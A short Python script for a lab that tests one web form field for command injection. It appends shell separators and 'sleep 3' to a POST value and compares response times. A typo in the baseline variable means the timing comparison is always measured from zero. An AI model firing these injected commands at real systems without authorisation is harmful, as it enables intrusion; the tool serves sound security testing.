#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File              : cmd_injection_tester.py
# Author            : tmaraval <no-mail@mail.com>
# Date              : 21.09.2018
# Last Modified Date: 21.09.2018
# Last Modified By  : tmaraval <no-mail@mail.com>

import urllib
from urllib.parse import urlencode
from urllib.request import Request, urlopen
import sys
import time

if len(sys.argv) != 3:
    print("*********************************************************************")
    print("*                                                                   *")
    print("* Usage python cmd_injection_tester.py http://yourlab.com fieldname *")
    print("*                                                                   *")
    print("*********************************************************************")
    sys.exit(1)

print("*********************************************************************")
print("*                                                                   *")
print("* cmd_injection_tester.py                                           *")
print("*                                                       by t0mux    *")
print("*********************************************************************")

print("Base command ? (ex : 127.0.0.1 if its a ping cmd )")

separator = ["&&", ";", "|", "\n"]
base_cmd = input("");
url = sys.argv[1]
post_1 = {sys.argv[2] : base_cmd}
base_responsetime = 0;
start = 0
end = 0

request = Request(url, urlencode(post_1).encode())
print("Firt POST request >>>")
start = time.time()
try: urlopen(request)
except urllib.error.URLError as e:
    print("Can't connect, check addr or network access")
    sys.exit(1)
end = time.time()
base_responstime = end - start
print("Elapsed time = " + str(end - start))
for sep in separator:
    post_2 = {sys.argv[2] : base_cmd + sep + " sleep 3"}
    request = Request(url, urlencode(post_2).encode())
    print(repr("payload = " + base_cmd + sep + " sleep 3"))
    start = time.time()
    try: urlopen(request)
    except urllib.error.URLError as e:
        print("Can't connect, check addr or network access")
        sys.exit(1)
    end = time.time()
    print("Elapsed time = " + str(end - start))
    print("delta without sleep = " + str((end - start) - base_responstime))
    if ((end - start) - base_responstime > 2):
        print("Probably vulnerable :)")
        break

